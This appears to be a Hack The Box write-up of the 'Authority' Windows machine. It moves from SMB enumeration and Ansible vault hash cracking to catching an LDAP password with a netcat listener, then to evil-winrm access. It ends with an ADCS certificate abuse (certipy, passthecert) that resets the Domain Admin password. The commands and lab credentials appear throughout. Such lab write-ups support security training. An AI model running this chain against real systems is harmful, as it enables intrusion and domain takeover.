<img src="Pasted image 20240722181428.png" alt="HTB Profile Image" class="htb-profile-img">

<style>
  .htb-profile-img {
    width: 100%;
    max-width: 800px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 255, 0, 0.8); /* Initial glow effect */
    transition: box-shadow 0.3s ease-in-out, transform 0.3s ease-in-out; /* Smooth transition for glow and zoom effects */
  }

  .htb-profile-img:hover {
    box-shadow: 0 0 20px rgba(0, 255, 0, 1); /* Enhanced glow on hover */
    transform: scale(1.05); /* Zoom effect on hover */
  }
</style>

**Ping**
```
ping 10.10.11.222
```
![[Pasted image 20240614144237.png]]

Nmap default Scan
```
nmap 10.10.11.222 -oN dnmap
```
![[Pasted image 20240614144713.png]]

Nmap Script and Service Scan
```
nmap 10.10.11.222 -sC -sV --open -T5 -oN snmap
```
![[Pasted image 20240614155526.png]]
![[Pasted image 20240614155610.png]]
![[Pasted image 20240614155641.png]]

Nmap All Port Scan
```
nmap 10.10.11.222 -sC -sV -p- --open -T5 -oN anmap
```
![[Pasted image 20240614155923.png]]
New ports found, but not useful.

**SMB Enumeration**
So will start with smb Enumeration
```
smbclient -U '' -L \\\\10.10.11.222\\
```
![[Pasted image 20240614160151.png]]
Found some shares without password

```
smbclient -N //10.10.11.222/Development
```
![[Pasted image 20240614160457.png]]
Enumerate the share further

After some enumeration in the share, i found there is some potential info in the PWM directory
![[Pasted image 20240614172133.png]]

Because Port 8443 has PWM running
![[Pasted image 20240614172249.png]]

Found admin creads in a file
![[Pasted image 20240614172322.png]]

But it doesn't work
```
crackmapexec winrm 10.10.11.222 -u administrator -p Welcome1
```
![[Pasted image 20240614172537.png]]
Will enumerate other folders

Found some interesting hashes the /default/main.yml file
![[Pasted image 20240614172644.png]]
![[Pasted image 20240614172659.png]]



Will decrypt it using John, first I saved the hashes in correct format by removing the extra space and lines.
![[Pasted image 20240614172930.png]]

Decryption Part
```
ansible2john ldap_admin pwm_admin_pass pwm_admin_login | tee vault_hashes
```
![[Pasted image 20240614173005.png]]

```
john --wordlist=/usr/share/wordlists/rockyou.txt vault_hashes
```
It will decrypt the vault password 

This are the cracked vault passwords
```
john vault_hashes --show
```
![[Pasted image 20240614173238.png]]

Now will find passwords of the users using the vault password
```
cat ldap_admin | ansible-vault decrypt
```
```
cat pwm_admin_pass | ansible-vault decrypt
```
```
cat pwm_admin_login | ansible-vault decrypt
```
![[Pasted image 20240614173504.png]]

Now we have passwords, will try to get initial foothold
```
crackmapexec smb 10.10.11.222 -u svc_pwm -p pass.txt
```
![[Pasted image 20240614175258.png]]
it show passwords are valid but can't list shares.

Using **'pWm_@dm!N_!23'** this password, we can at least login to configuration settings
![[Pasted image 20240614175357.png]]

And also we able to access the configuration editor, and changed the ldap path to my ip to garb any key info
![[Pasted image 20240614175707.png]]
Changed ldap url to point my ip in ldap default port ldap://10.10.14.2:389
and clicked the test ldap profile button

Before testing the ldap profile I have set up an nc listener on port 389 to capture any response
```
nc -nvlp 389
```
![[Pasted image 20240614175948.png]]
We captured the Service acc password is (lDaP_1n_th3_cle4r!) remove the **htb** and **0p** in the end

Will try this to get initial foothold
```
crackmapexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```
![[Pasted image 20240614180716.png]]

Evil-winrm
```
evil-winrm -i 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
```
![[Pasted image 20240614180850.png]]

I think still we haven't got a admin privilege I guess, because though he got pwn3d sign in crackmaexec, our privileges shows, we are not an admin
![[Pasted image 20240614180941.png]]

```
net user svc_ldap
```
![[Pasted image 20240614181301.png]]

Got our user.txt from 
![[Pasted image 20240614181146.png]]

Will jump to Privilege Escalation....!

We a Privilege to add computers to the domain
```
whoami /priv
```
![[Pasted image 20240614193426.png]]

Also it is always a good practise to check the ADCS
```
certipy find -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 -vulnerable
```
![[Pasted image 20240614193629.png]]
```
cat 20240614184507_Certipy.txt
```
![[Pasted image 20240614193703.png]]
![[Pasted image 20240614193748.png]]
![[Pasted image 20240614193830.png]]

So I have added a new computer to the domain
```
certipy req -username 'ComputerName$' -password password -ca AUTHORITY-CA -dc-ip 10.10.11.222 -template CorpVPN -upn administrator@authority.htb -dns authority.htb
```
![[Pasted image 20240614193947.png]]

Writing .key file
```
certipy cert -pfx administrator_authority.pfx -nocert -out administrator.key
```
![[Pasted image 20240614194154.png]]

Writing .crt file
```
certipy cert -pfx administrator_authority.pfx -nokey -out administrator.crt
```
![[Pasted image 20240614194241.png]]

Now changing the Domain Admin Password
```
python passthecert.py -action modify_user -crt administrator.crt -key administrator.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass
```
![[Pasted image 20240614194340.png]]

Now we can use Evil-winrm to get a remote session
```
evil-winrm -i 10.10.11.222 -u administrator -p Sk3qknFNi7p4wyPatgi2Z24qfpYp8aMr
```
![[Pasted image 20240614194453.png]]
Finally We got Admin Shell.

Will get root.txt from Administrator's Desktop
![[Pasted image 20240614194603.png]]




Doneeeeee With Authority…:) 